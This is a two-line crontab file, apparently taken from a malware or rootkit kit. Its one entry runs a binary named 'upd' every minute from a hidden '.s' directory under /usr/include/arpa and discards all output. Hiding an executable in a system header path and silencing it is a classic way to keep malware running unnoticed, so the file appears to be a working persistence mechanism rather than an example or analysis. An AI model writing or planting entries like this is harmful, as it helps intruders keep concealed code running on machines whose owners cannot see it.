# .s/cron.d
* * * * * /usr/include/arpa/.s/upd >/dev/null 2>&1
